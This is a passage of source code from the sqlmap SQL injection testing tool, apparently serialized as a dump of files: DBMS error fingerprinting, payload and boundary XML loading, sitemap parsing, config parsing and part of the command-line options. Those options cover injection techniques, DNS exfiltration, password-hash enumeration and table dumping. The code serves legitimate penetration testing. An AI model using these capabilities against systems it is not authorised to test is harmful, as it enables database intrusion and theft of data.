page[:HEURISTIC_PAGE_SIZE_THRESHOLD]\n\n    xmlfile = paths.ERRORS_XML\n    handler = HTMLHandler(page)\n    key = hash(page)\n\n    # generic SQL warning/error messages\n    if re.search(r\"SQL (warning|error|syntax)\", page, re.I):\n        handler._markAsErrorPage()\n\n    if key in kb.cache.parsedDbms:\n        retVal = kb.cache.parsedDbms[key]\n        if retVal:\n            handler._markAsErrorPage()\n        return retVal\n\n    parseXmlFile(xmlfile, handler)\n\n    if handler.dbms and handler.dbms not in kb.htmlFp:\n        kb.lastParserStatus = handler.dbms\n        kb.htmlFp.append(handler.dbms)\n    else:\n        kb.lastParserStatus = None\n\n    kb.cache.parsedDbms[key] = handler.dbms\n\n    return handler.dbms\n", "lib/parse/payloads.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom xml.etree import ElementTree as et\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import paths\nfrom lib.core.datatype import AttribDict\nfrom lib.core.exception import SqlmapInstallationException\nfrom lib.core.settings import PAYLOAD_XML_FILES\n\ndef cleanupVals(text, tag):\n    if tag == \"clause\" and '-' in text:\n        text = re.sub(r\"(\\d+)-(\\d+)\", lambda match: ','.join(str(_) for _ in xrange(int(match.group(1)), int(match.group(2)) + 1)), text)\n\n    if tag in (\"clause\", \"where\"):\n        text = text.split(',')\n\n    if hasattr(text, \"isdigit\") and text.isdigit():\n        text = int(text)\n\n    elif isinstance(text, list):\n        count = 0\n\n        for _ in text:\n            text[count] = int(_) if _.isdigit() else _\n            count += 1\n\n        if len(text) == 1 and tag not in (\"clause\", \"where\"):\n            text = text[0]\n\n    return text\n\ndef parseXmlNode(node):\n    for element in node.findall(\"boundary\"):\n        boundary = AttribDict()\n\n        for child in element:\n            if child.text:\n                values = cleanupVals(child.text, child.tag)\n                boundary[child.tag] = values\n            else:\n                boundary[child.tag] = None\n\n        conf.boundaries.append(boundary)\n\n    for element in node.findall(\"test\"):\n        test = AttribDict()\n\n        for child in element:\n            if child.text and child.text.strip():\n                values = cleanupVals(child.text, child.tag)\n                test[child.tag] = values\n            else:\n                if len(child.findall(\"*\")) == 0:\n                    test[child.tag] = None\n                    continue\n                else:\n                    test[child.tag] = AttribDict()\n\n                for gchild in child:\n                    if gchild.tag in test[child.tag]:\n                        prevtext = test[child.tag][gchild.tag]\n                        test[child.tag][gchild.tag] = [prevtext, gchild.text]\n                    else:\n                        test[child.tag][gchild.tag] = gchild.text\n\n        conf.tests.append(test)\n\ndef loadBoundaries():\n    \"\"\"\n    Loads boundaries from XML\n\n    >>> conf.boundaries = []\n    >>> loadBoundaries()\n    >>> len(conf.boundaries) > 0\n    True\n    \"\"\"\n\n    try:\n        doc = et.parse(paths.BOUNDARIES_XML)\n    except Exception as ex:\n        errMsg = \"something appears to be wrong with \"\n        errMsg += \"the file '%s' ('%s'). Please make \" % (paths.BOUNDARIES_XML, getSafeExString(ex))\n        errMsg += \"sure that you haven't made any changes to it\"\n        raise SqlmapInstallationException(errMsg)\n\n    root = doc.getroot()\n    parseXmlNode(root)\n\ndef loadPayloads():\n    \"\"\"\n    Loads payloads/tests from XML\n\n    >>> conf.tests = []\n    >>> loadPayloads()\n    >>> len(conf.tests) > 0\n    True\n    \"\"\"\n\n    for payloadFile in PAYLOAD_XML_FILES:\n        payloadFilePath = os.path.join(paths.SQLMAP_XML_PAYLOADS_PATH, payloadFile)\n\n        try:\n            doc = et.parse(payloadFilePath)\n        except Exception as ex:\n            errMsg = \"something appears to be wrong with \"\n            errMsg += \"the file '%s' ('%s'). Please make \" % (payloadFilePath, getSafeExString(ex))\n            errMsg += \"sure that you haven't made any changes to it\"\n            raise SqlmapInstallationException(errMsg)\n\n        root = doc.getroot()\n        parseXmlNode(root)\n", "lib/parse/sitemap.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import readInput\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.datatype import OrderedSet\nfrom lib.core.exception import SqlmapSyntaxException\nfrom lib.request.connect import Connect as Request\nfrom thirdparty.six.moves import http_client as _http_client\n\nabortedFlag = None\n\ndef parseSitemap(url, retVal=None):\n    global abortedFlag\n\n    if retVal is not None:\n        logger.debug(\"parsing sitemap '%s'\" % url)\n\n    try:\n        if retVal is None:\n            abortedFlag = False\n            retVal = OrderedSet()\n\n        try:\n            content = Request.getPage(url=url, raise404=True)[0] if not abortedFlag else \"\"\n        except _http_client.InvalidURL:\n            errMsg = \"invalid URL given for sitemap ('%s')\" % url\n            raise SqlmapSyntaxException(errMsg)\n\n        for match in re.finditer(r\"<loc>\\s*([^<]+)\", content or \"\"):\n            if abortedFlag:\n                break\n            url = match.group(1).strip()\n            if url.endswith(\".xml\") and \"sitemap\" in url.lower():\n                if kb.followSitemapRecursion is None:\n                    message = \"sitemap recursion detected. Do you want to follow? [y/N] \"\n                    kb.followSitemapRecursion = readInput(message, default='N', boolean=True)\n                if kb.followSitemapRecursion:\n                    parseSitemap(url, retVal)\n            else:\n                retVal.add(url)\n\n    except KeyboardInterrupt:\n        abortedFlag = True\n        warnMsg = \"user aborted during sitemap parsing. sqlmap \"\n        warnMsg += \"will use partial list\"\n        logger.warning(warnMsg)\n\n    return retVal\n", "lib/parse/configfile.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import checkFile\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import openFile\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import UnicodeRawConfigParser\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import cmdLineOptions\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.enums import OPTION_TYPE\nfrom lib.core.exception import SqlmapMissingMandatoryOptionException\nfrom lib.core.exception import SqlmapSyntaxException\nfrom lib.core.optiondict import optDict\n\nconfig = None\n\ndef configFileProxy(section, option, datatype):\n    \"\"\"\n    Parse configuration file and save settings into the configuration\n    advanced dictionary.\n    \"\"\"\n\n    if config.has_option(section, option):\n        try:\n            if datatype == OPTION_TYPE.BOOLEAN:\n                value = config.getboolean(section, option) if config.get(section, option) else False\n            elif datatype == OPTION_TYPE.INTEGER:\n                value = config.getint(section, option) if config.get(section, option) else 0\n            elif datatype == OPTION_TYPE.FLOAT:\n                value = config.getfloat(section, option) if config.get(section, option) else 0.0\n            else:\n                value = config.get(section, option)\n        except ValueError as ex:\n            errMsg = \"error occurred while processing the option \"\n            errMsg += \"'%s' in provided configuration file ('%s')\" % (option, getUnicode(ex))\n            raise SqlmapSyntaxException(errMsg)\n\n        if value:\n            conf[option] = value\n        else:\n            conf[option] = None\n    else:\n        debugMsg = \"missing requested option '%s' (section \" % option\n        debugMsg += \"'%s') into the configuration file, \" % section\n        debugMsg += \"ignoring. Skipping to next.\"\n        logger.debug(debugMsg)\n\ndef configFileParser(configFile):\n    \"\"\"\n    Parse configuration file and save settings into the configuration\n    advanced dictionary.\n    \"\"\"\n\n    global config\n\n    debugMsg = \"parsing configuration file\"\n    logger.debug(debugMsg)\n\n    checkFile(configFile)\n    configFP = openFile(configFile, \"rb\")\n\n    try:\n        config = UnicodeRawConfigParser()\n        if hasattr(config, \"read_file\"):\n            config.read_file(configFP)\n        else:\n            config.readfp(configFP)\n    except Exception as ex:\n        errMsg = \"you have provided an invalid and/or unreadable configuration file ('%s')\" % getSafeExString(ex)\n        raise SqlmapSyntaxException(errMsg)\n\n    if not config.has_section(\"Target\"):\n        errMsg = \"missing a mandatory section 'Target' in the configuration file\"\n        raise SqlmapMissingMandatoryOptionException(errMsg)\n\n    mandatory = False\n\n    for option in (\"direct\", \"url\", \"logFile\", \"bulkFile\", \"googleDork\", \"requestFile\", \"wizard\"):\n        if config.has_option(\"Target\", option) and config.get(\"Target\", option) or cmdLineOptions.get(option):\n            mandatory = True\n            break\n\n    if not mandatory:\n        errMsg = \"missing a mandatory option in the configuration file \"\n        errMsg += \"(direct, url, logFile, bulkFile, googleDork, requestFile or wizard)\"\n        raise SqlmapMissingMandatoryOptionException(errMsg)\n\n    for family, optionData in optDict.items():\n        for option, datatype in optionData.items():\n            datatype = unArrayizeValue(datatype)\n            configFileProxy(family, option, datatype)\n", "lib/parse/cmdline.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport os\nimport re\nimport shlex\nimport sys\n\ntry:\n    from optparse import OptionError as ArgumentError\n    from optparse import OptionGroup\n    from optparse import OptionParser as ArgumentParser\n    from optparse import SUPPRESS_HELP as SUPPRESS\n\n    ArgumentParser.add_argument = ArgumentParser.add_option\n\n    def _add_argument_group(self, *args, **kwargs):\n        return self.add_option_group(OptionGroup(self, *args, **kwargs))\n\n    ArgumentParser.add_argument_group = _add_argument_group\n\n    def _add_argument(self, *args, **kwargs):\n        return self.add_option(*args, **kwargs)\n\n    OptionGroup.add_argument = _add_argument\n\nexcept ImportError:\n    from argparse import ArgumentParser\n    from argparse import ArgumentError\n    from argparse import SUPPRESS\n\nfinally:\n    def get_actions(instance):\n        for attr in (\"option_list\", \"_group_actions\", \"_actions\"):\n            if hasattr(instance, attr):\n                return getattr(instance, attr)\n\n    def get_groups(parser):\n        return getattr(parser, \"option_groups\", None) or getattr(parser, \"_action_groups\")\n\n    def get_all_options(parser):\n        retVal = set()\n\n        for option in get_actions(parser):\n            if hasattr(option, \"option_strings\"):\n                retVal.update(option.option_strings)\n            else:\n                retVal.update(option._long_opts)\n                retVal.update(option._short_opts)\n\n        for group in get_groups(parser):\n            for option in get_actions(group):\n                if hasattr(option, \"option_strings\"):\n                    retVal.update(option.option_strings)\n                else:\n                    retVal.update(option._long_opts)\n                    retVal.update(option._short_opts)\n\n        return retVal\n\nfrom lib.core.common import checkOldOptions\nfrom lib.core.common import checkSystemEncoding\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import expandMnemonics\nfrom lib.core.common import getSafeExString\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import cmdLineOptions\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.defaults import defaults\nfrom lib.core.dicts import DEPRECATED_OPTIONS\nfrom lib.core.enums import AUTOCOMPLETE_TYPE\nfrom lib.core.exception import SqlmapShellQuitException\nfrom lib.core.exception import SqlmapSilentQuitException\nfrom lib.core.exception import SqlmapSyntaxException\nfrom lib.core.option import _createHomeDirectories\nfrom lib.core.settings import BASIC_HELP_ITEMS\nfrom lib.core.settings import DUMMY_URL\nfrom lib.core.settings import IGNORED_OPTIONS\nfrom lib.core.settings import INFERENCE_UNKNOWN_CHAR\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import MAX_HELP_OPTION_LENGTH\nfrom lib.core.settings import VERSION_STRING\nfrom lib.core.shell import autoCompletion\nfrom lib.core.shell import clearHistory\nfrom lib.core.shell import loadHistory\nfrom lib.core.shell import saveHistory\nfrom thirdparty.six.moves import input as _input\n\ndef cmdLineParser(argv=None):\n    \"\"\"\n    This function parses the command line parameters and arguments\n    \"\"\"\n\n    if not argv:\n        argv = sys.argv\n\n    checkSystemEncoding()\n\n    # Reference: https://stackoverflow.com/a/4012683 (Note: previously used \"...sys.getfilesystemencoding() or UNICODE_ENCODING\")\n    _ = getUnicode(os.path.basename(argv[0]), encoding=sys.stdin.encoding)\n\n    usage = \"%s%s [options]\" % (\"%s \" % os.path.basename(sys.executable) if not IS_WIN else \"\", \"\\\"%s\\\"\" % _ if \" \" in _ else _)\n    parser = ArgumentParser(usage=usage)\n\n    try:\n        parser.add_argument(\"--hh\", dest=\"advancedHelp\", action=\"store_true\",\n            help=\"Show advanced help message and exit\")\n\n        parser.add_argument(\"--version\", dest=\"showVersion\", action=\"store_true\",\n            help=\"Show program's version number and exit\")\n\n        parser.add_argument(\"-v\", dest=\"verbose\", type=int,\n            help=\"Verbosity level: 0-6 (default %d)\" % defaults.verbose)\n\n        # Target options\n        target = parser.add_argument_group(\"Target\", \"At least one of these options has to be provided to define the target(s)\")\n\n        target.add_argument(\"-u\", \"--url\", dest=\"url\",\n            help=\"Target URL (e.g. \\\"http://www.site.com/vuln.php?id=1\\\")\")\n\n        target.add_argument(\"-d\", dest=\"direct\",\n            help=\"Connection string for direct database connection\")\n\n        target.add_argument(\"-l\", dest=\"logFile\",\n            help=\"Parse target(s) from Burp or WebScarab proxy log file\")\n\n        target.add_argument(\"-m\", dest=\"bulkFile\",\n            help=\"Scan multiple targets given in a textual file \")\n\n        target.add_argument(\"-r\", dest=\"requestFile\",\n            help=\"Load HTTP request from a file\")\n\n        target.add_argument(\"-g\", dest=\"googleDork\",\n            help=\"Process Google dork results as target URLs\")\n\n        target.add_argument(\"-c\", dest=\"configFile\",\n            help=\"Load options from a configuration INI file\")\n\n        # Request options\n        request = parser.add_argument_group(\"Request\", \"These options can be used to specify how to connect to the target URL\")\n\n        request.add_argument(\"-A\", \"--user-agent\", dest=\"agent\",\n            help=\"HTTP User-Agent header value\")\n\n        request.add_argument(\"-H\", \"--header\", dest=\"header\",\n            help=\"Extra header (e.g. \\\"X-Forwarded-For: 127.0.0.1\\\")\")\n\n        request.add_argument(\"--method\", dest=\"method\",\n            help=\"Force usage of given HTTP method (e.g. PUT)\")\n\n        request.add_argument(\"--data\", dest=\"data\",\n            help=\"Data string to be sent through POST (e.g. \\\"id=1\\\")\")\n\n        request.add_argument(\"--param-del\", dest=\"paramDel\",\n            help=\"Character used for splitting parameter values (e.g. &)\")\n\n        request.add_argument(\"--cookie\", dest=\"cookie\",\n            help=\"HTTP Cookie header value (e.g. \\\"PHPSESSID=a8d127e..\\\")\")\n\n        request.add_argument(\"--cookie-del\", dest=\"cookieDel\",\n            help=\"Character used for splitting cookie values (e.g. ;)\")\n\n        request.add_argument(\"--live-cookies\", dest=\"liveCookies\",\n            help=\"Live cookies file used for loading up-to-date values\")\n\n        request.add_argument(\"--load-cookies\", dest=\"loadCookies\",\n            help=\"File containing cookies in Netscape/wget format\")\n\n        request.add_argument(\"--drop-set-cookie\", dest=\"dropSetCookie\", action=\"store_true\",\n            help=\"Ignore Set-Cookie header from response\")\n\n        request.add_argument(\"--mobile\", dest=\"mobile\", action=\"store_true\",\n            help=\"Imitate smartphone through HTTP User-Agent header\")\n\n        request.add_argument(\"--random-agent\", dest=\"randomAgent\", action=\"store_true\",\n            help=\"Use randomly selected HTTP User-Agent header value\")\n\n        request.add_argument(\"--host\", dest=\"host\",\n            help=\"HTTP Host header value\")\n\n        request.add_argument(\"--referer\", dest=\"referer\",\n            help=\"HTTP Referer header value\")\n\n        request.add_argument(\"--headers\", dest=\"headers\",\n            help=\"Extra headers (e.g. \\\"Accept-Language: fr\\\\nETag: 123\\\")\")\n\n        request.add_argument(\"--auth-type\", dest=\"authType\",\n            help=\"HTTP authentication type (Basic, Digest, Bearer, ...)\")\n\n        request.add_argument(\"--auth-cred\", dest=\"authCred\",\n            help=\"HTTP authentication credentials (name:password)\")\n\n        request.add_argument(\"--auth-file\", dest=\"authFile\",\n            help=\"HTTP authentication PEM cert/private key file\")\n\n        request.add_argument(\"--abort-code\", dest=\"abortCode\",\n            help=\"Abort on (problematic) HTTP error code(s) (e.g. 401)\")\n\n        request.add_argument(\"--ignore-code\", dest=\"ignoreCode\",\n            help=\"Ignore (problematic) HTTP error code(s) (e.g. 401)\")\n\n        request.add_argument(\"--ignore-proxy\", dest=\"ignoreProxy\", action=\"store_true\",\n            help=\"Ignore system default proxy settings\")\n\n        request.add_argument(\"--ignore-redirects\", dest=\"ignoreRedirects\", action=\"store_true\",\n            help=\"Ignore redirection attempts\")\n\n        request.add_argument(\"--ignore-timeouts\", dest=\"ignoreTimeouts\", action=\"store_true\",\n            help=\"Ignore connection timeouts\")\n\n        request.add_argument(\"--proxy\", dest=\"proxy\",\n            help=\"Use a proxy to connect to the target URL\")\n\n        request.add_argument(\"--proxy-cred\", dest=\"proxyCred\",\n            help=\"Proxy authentication credentials (name:password)\")\n\n        request.add_argument(\"--proxy-file\", dest=\"proxyFile\",\n            help=\"Load proxy list from a file\")\n\n        request.add_argument(\"--proxy-freq\", dest=\"proxyFreq\", type=int,\n            help=\"Requests between change of proxy from a given list\")\n\n        request.add_argument(\"--tor\", dest=\"tor\", action=\"store_true\",\n            help=\"Use Tor anonymity network\")\n\n        request.add_argument(\"--tor-port\", dest=\"torPort\",\n            help=\"Set Tor proxy port other than default\")\n\n        request.add_argument(\"--tor-type\", dest=\"torType\",\n            help=\"Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))\")\n\n        request.add_argument(\"--check-tor\", dest=\"checkTor\", action=\"store_true\",\n            help=\"Check to see if Tor is used properly\")\n\n        request.add_argument(\"--delay\", dest=\"delay\", type=float,\n            help=\"Delay in seconds between each HTTP request\")\n\n        request.add_argument(\"--timeout\", dest=\"timeout\", type=float,\n            help=\"Seconds to wait before timeout connection (default %d)\" % defaults.timeout)\n\n        request.add_argument(\"--retries\", dest=\"retries\", type=int,\n            help=\"Retries when the connection timeouts (default %d)\" % defaults.retries)\n\n        request.add_argument(\"--retry-on\", dest=\"retryOn\",\n            help=\"Retry request on regexp matching content (e.g. \\\"drop\\\")\")\n\n        request.add_argument(\"--randomize\", dest=\"rParam\",\n            help=\"Randomly change value for given parameter(s)\")\n\n        request.add_argument(\"--safe-url\", dest=\"safeUrl\",\n            help=\"URL address to visit frequently during testing\")\n\n        request.add_argument(\"--safe-post\", dest=\"safePost\",\n            help=\"POST data to send to a safe URL\")\n\n        request.add_argument(\"--safe-req\", dest=\"safeReqFile\",\n            help=\"Load safe HTTP request from a file\")\n\n        request.add_argument(\"--safe-freq\", dest=\"safeFreq\", type=int,\n            help=\"Regular requests between visits to a safe URL\")\n\n        request.add_argument(\"--skip-urlencode\", dest=\"skipUrlEncode\", action=\"store_true\",\n            help=\"Skip URL encoding of payload data\")\n\n        request.add_argument(\"--csrf-token\", dest=\"csrfToken\",\n            help=\"Parameter used to hold anti-CSRF token\")\n\n        request.add_argument(\"--csrf-url\", dest=\"csrfUrl\",\n            help=\"URL address to visit for extraction of anti-CSRF token\")\n\n        request.add_argument(\"--csrf-method\", dest=\"csrfMethod\",\n            help=\"HTTP method to use during anti-CSRF token page visit\")\n\n        request.add_argument(\"--csrf-data\", dest=\"csrfData\",\n            help=\"POST data to send during anti-CSRF token page visit\")\n\n        request.add_argument(\"--csrf-retries\", dest=\"csrfRetries\", type=int,\n            help=\"Retries for anti-CSRF token retrieval (default %d)\" % defaults.csrfRetries)\n\n        request.add_argument(\"--force-ssl\", dest=\"forceSSL\", action=\"store_true\",\n            help=\"Force usage of SSL/HTTPS\")\n\n        request.add_argument(\"--chunked\", dest=\"chunked\", action=\"store_true\",\n            help=\"Use HTTP chunked transfer encoded (POST) requests\")\n\n        request.add_argument(\"--hpp\", dest=\"hpp\", action=\"store_true\",\n            help=\"Use HTTP parameter pollution method\")\n\n        request.add_argument(\"--eval\", dest=\"evalCode\",\n            help=\"Evaluate provided Python code before the request (e.g. \\\"import hashlib;id2=hashlib.md5(id).hexdigest()\\\")\")\n\n        # Optimization options\n        optimization = parser.add_argument_group(\"Optimization\", \"These options can be used to optimize the performance of sqlmap\")\n\n        optimization.add_argument(\"-o\", dest=\"optimize\", action=\"store_true\",\n            help=\"Turn on all optimization switches\")\n\n        optimization.add_argument(\"--predict-output\", dest=\"predictOutput\", action=\"store_true\",\n            help=\"Predict common queries output\")\n\n        optimization.add_argument(\"--keep-alive\", dest=\"keepAlive\", action=\"store_true\",\n            help=\"Use persistent HTTP(s) connections\")\n\n        optimization.add_argument(\"--null-connection\", dest=\"nullConnection\", action=\"store_true\",\n            help=\"Retrieve page length without actual HTTP response body\")\n\n        optimization.add_argument(\"--threads\", dest=\"threads\", type=int,\n            help=\"Max number of concurrent HTTP(s) requests (default %d)\" % defaults.threads)\n\n        # Injection options\n        injection = parser.add_argument_group(\"Injection\", \"These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts\")\n\n        injection.add_argument(\"-p\", dest=\"testParameter\",\n            help=\"Testable parameter(s)\")\n\n        injection.add_argument(\"--skip\", dest=\"skip\",\n            help=\"Skip testing for given parameter(s)\")\n\n        injection.add_argument(\"--skip-static\", dest=\"skipStatic\", action=\"store_true\",\n            help=\"Skip testing parameters that not appear to be dynamic\")\n\n        injection.add_argument(\"--param-exclude\", dest=\"paramExclude\",\n            help=\"Regexp to exclude parameters from testing (e.g. \\\"ses\\\")\")\n\n        injection.add_argument(\"--param-filter\", dest=\"paramFilter\",\n            help=\"Select testable parameter(s) by place (e.g. \\\"POST\\\")\")\n\n        injection.add_argument(\"--dbms\", dest=\"dbms\",\n            help=\"Force back-end DBMS to provided value\")\n\n        injection.add_argument(\"--dbms-cred\", dest=\"dbmsCred\",\n            help=\"DBMS authentication credentials (user:password)\")\n\n        injection.add_argument(\"--os\", dest=\"os\",\n            help=\"Force back-end DBMS operating system to provided value\")\n\n        injection.add_argument(\"--invalid-bignum\", dest=\"invalidBignum\", action=\"store_true\",\n            help=\"Use big numbers for invalidating values\")\n\n        injection.add_argument(\"--invalid-logical\", dest=\"invalidLogical\", action=\"store_true\",\n            help=\"Use logical operations for invalidating values\")\n\n        injection.add_argument(\"--invalid-string\", dest=\"invalidString\", action=\"store_true\",\n            help=\"Use random strings for invalidating values\")\n\n        injection.add_argument(\"--no-cast\", dest=\"noCast\", action=\"store_true\",\n            help=\"Turn off payload casting mechanism\")\n\n        injection.add_argument(\"--no-escape\", dest=\"noEscape\", action=\"store_true\",\n            help=\"Turn off string escaping mechanism\")\n\n        injection.add_argument(\"--prefix\", dest=\"prefix\",\n            help=\"Injection payload prefix string\")\n\n        injection.add_argument(\"--suffix\", dest=\"suffix\",\n            help=\"Injection payload suffix string\")\n\n        injection.add_argument(\"--tamper\", dest=\"tamper\",\n            help=\"Use given script(s) for tampering injection data\")\n\n        # Detection options\n        detection = parser.add_argument_group(\"Detection\", \"These options can be used to customize the detection phase\")\n\n        detection.add_argument(\"--level\", dest=\"level\", type=int,\n            help=\"Level of tests to perform (1-5, default %d)\" % defaults.level)\n\n        detection.add_argument(\"--risk\", dest=\"risk\", type=int,\n            help=\"Risk of tests to perform (1-3, default %d)\" % defaults.risk)\n\n        detection.add_argument(\"--string\", dest=\"string\",\n            help=\"String to match when query is evaluated to True\")\n\n        detection.add_argument(\"--not-string\", dest=\"notString\",\n            help=\"String to match when query is evaluated to False\")\n\n        detection.add_argument(\"--regexp\", dest=\"regexp\",\n            help=\"Regexp to match when query is evaluated to True\")\n\n        detection.add_argument(\"--code\", dest=\"code\", type=int,\n            help=\"HTTP code to match when query is evaluated to True\")\n\n        detection.add_argument(\"--smart\", dest=\"smart\", action=\"store_true\",\n            help=\"Perform thorough tests only if positive heuristic(s)\")\n\n        detection.add_argument(\"--text-only\", dest=\"textOnly\", action=\"store_true\",\n            help=\"Compare pages based only on the textual content\")\n\n        detection.add_argument(\"--titles\", dest=\"titles\", action=\"store_true\",\n            help=\"Compare pages based only on their titles\")\n\n        # Techniques options\n        techniques = parser.add_argument_group(\"Techniques\", \"These options can be used to tweak testing of specific SQL injection techniques\")\n\n        techniques.add_argument(\"--technique\", dest=\"technique\",\n            help=\"SQL injection techniques to use (default \\\"%s\\\")\" % defaults.technique)\n\n        techniques.add_argument(\"--time-sec\", dest=\"timeSec\", type=int,\n            help=\"Seconds to delay the DBMS response (default %d)\" % defaults.timeSec)\n\n        techniques.add_argument(\"--union-cols\", dest=\"uCols\",\n            help=\"Range of columns to test for UNION query SQL injection\")\n\n        techniques.add_argument(\"--union-char\", dest=\"uChar\",\n            help=\"Character to use for bruteforcing number of columns\")\n\n        techniques.add_argument(\"--union-from\", dest=\"uFrom\",\n            help=\"Table to use in FROM part of UNION query SQL injection\")\n\n        techniques.add_argument(\"--union-values\", dest=\"uValues\",\n            help=\"Column values to use for UNION query SQL injection\")\n\n        techniques.add_argument(\"--dns-domain\", dest=\"dnsDomain\",\n            help=\"Domain name used for DNS exfiltration attack\")\n\n        techniques.add_argument(\"--second-url\", dest=\"secondUrl\",\n            help=\"Resulting page URL searched for second-order response\")\n\n        techniques.add_argument(\"--second-req\", dest=\"secondReq\",\n            help=\"Load second-order HTTP request from file\")\n\n        # Fingerprint options\n        fingerprint = parser.add_argument_group(\"Fingerprint\")\n\n        fingerprint.add_argument(\"-f\", \"--fingerprint\", dest=\"extensiveFp\", action=\"store_true\",\n            help=\"Perform an extensive DBMS version fingerprint\")\n\n        # Enumeration options\n        enumeration = parser.add_argument_group(\"Enumeration\", \"These options can be used to enumerate the back-end database management system information, structure and data contained in the tables\")\n\n        enumeration.add_argument(\"-a\", \"--all\", dest=\"getAll\", action=\"store_true\",\n            help=\"Retrieve everything\")\n\n        enumeration.add_argument(\"-b\", \"--banner\", dest=\"getBanner\", action=\"store_true\",\n            help=\"Retrieve DBMS banner\")\n\n        enumeration.add_argument(\"--current-user\", dest=\"getCurrentUser\", action=\"store_true\",\n            help=\"Retrieve DBMS current user\")\n\n        enumeration.add_argument(\"--current-db\", dest=\"getCurrentDb\", action=\"store_true\",\n            help=\"Retrieve DBMS current database\")\n\n        enumeration.add_argument(\"--hostname\", dest=\"getHostname\", action=\"store_true\",\n            help=\"Retrieve DBMS server hostname\")\n\n        enumeration.add_argument(\"--is-dba\", dest=\"isDba\", action=\"store_true\",\n            help=\"Detect if the DBMS current user is DBA\")\n\n        enumeration.add_argument(\"--users\", dest=\"getUsers\", action=\"store_true\",\n            help=\"Enumerate DBMS users\")\n\n        enumeration.add_argument(\"--passwords\", dest=\"getPasswordHashes\", action=\"store_true\",\n            help=\"Enumerate DBMS users password hashes\")\n\n        enumeration.add_argument(\"--privileges\", dest=\"getPrivileges\", action=\"store_true\",\n            help=\"Enumerate DBMS users privileges\")\n\n        enumeration.add_argument(\"--roles\", dest=\"getRoles\", action=\"store_true\",\n            help=\"Enumerate DBMS users roles\")\n\n        enumeration.add_argument(\"--dbs\", dest=\"getDbs\", action=\"store_true\",\n            help=\"Enumerate DBMS databases\")\n\n        enumeration.add_argument(\"--tables\", dest=\"getTables\", action=\"store_true\",\n            help=\"Enumerate DBMS database tables\")\n\n        enumeration.add_argument(\"--columns\", dest=\"getColumns\", action=\"store_true\",\n            help=\"Enumerate DBMS database table columns\")\n\n        enumeration.add_argument(\"--schema\", dest=\"getSchema\", action=\"store_true\",\n            help=\"Enumerate DBMS schema\")\n\n        enumeration.add_argument(\"--count\", dest=\"getCount\", action=\"store_true\",\n            help=\"Retrieve number of entries for table(s)\")\n\n        enumeration.add_argument(\"--dump\", dest=\"dumpTable\", action=\"store_true\",\n            help=\"Dump DBMS database table entries\")\n\n        enumeration.add_argument(\"--dump-all\", dest=\"dumpAll\", action=\"store_true\",\n            help=\"Dump all DBMS databases tables entries\")\n\n        enumeration.add_argument(\"--search\", dest=\"search\", action=\"store_true\",\n            help=\"Search column(s), table(s) and/or database name(s)\")\n\n        enumeration.add_argument(\"--comments\", dest=\"getComments\", action=\"store_true\",\n            help=\"Check for DBMS comments during enumeration\")\n\n        enumeration.add_argument(\"--statements\", dest=\"getStatements\", action=\"store_true\",\n            help=\"Retrieve SQL statements being run on DBMS\")\n\n        enumeration.add_argument(\"-D\", dest=\"db\",\n            help=\"DBMS database to enumerate\")\n\n        enumeration.add_argument(\"-T\", dest=\"tbl\",\n            help=\"DBMS database table(s) to enumerate\")\n\n        enumeration.add_argument(\"-C\", dest=\"col\",\n            help=\"DBMS database table column(s) to enumerate\")\n\n        enumeration.add_argument(\"-X\", dest=\"exclude\",\n            help=\"DBMS database identifier(s) to not enumerate\")\n\n        enumeration.add_argument(\"-U\", dest=\"user\",\n            help=\"DBMS user to enumerate\")\n\n        enumeration.add_argument(\"--exclude-sysdbs\", dest=\"excludeSysDbs\", action=\"store_true\",\n            help=\"Exclude DBMS system databases when enumerating tables\")\n\n        enumeration.add_argument(\"--pivot-column\", dest=\"pivotColumn\",\n            help=\"Pivot column name\")\n\n        enumeration.add_argument(\"--where\", dest=\"dumpWhere\",\n            help=\"Use WHERE condition while table dumping\")\n\n        enumeration.add_argument(\"--start\", dest=\"limitStart\", type=int,\n            help=\"First dump table entry to retrieve\")\n\n        enumeration.add_argument(\"--stop\", dest=\"limitStop\", type=int,\n            help=\"Last dump table entry to retrieve\")\n\n        enumeration.add_argument(\"--first\", dest=\"firstChar\", type=int,\n            help=\"First query output word character to retrieve\")\n\n        enumeration.add_argument(\"--last\", dest=\"lastChar\", type=int,\n            help=\"Last query output word character to retrieve\")\n\n        enumeration.add_argument(\"--sql-query\", dest=\"sqlQuery\",\n            help=\"SQL statement to be executed\")\n\n        enumeration.add_argument(\"--sql-shell\", dest=\"sqlShell\", action=\"store_true\",\n            help=\"Prompt for an interactive SQL shell\")\n\n        enumeration.add_argument(\"--sql-file\", dest=\"sqlFile\",\n            help=\"Execute SQL statements from given file(s)\")\n\n        # Brute force options\n        brute = parser.add_argument_group(\"Brute force\", \"These options can be used to run brute force checks\")\n\n        brute.add_argument(\"--common-tables\", dest=\"commonTables\", action=\"store_true\",\n            help=\"Check existence of common tables\")\n\n        brute.add_argument(\"--common-columns\", dest=\"commonColumns\", action=\"store_true\",\n            help=\"Check existence of common 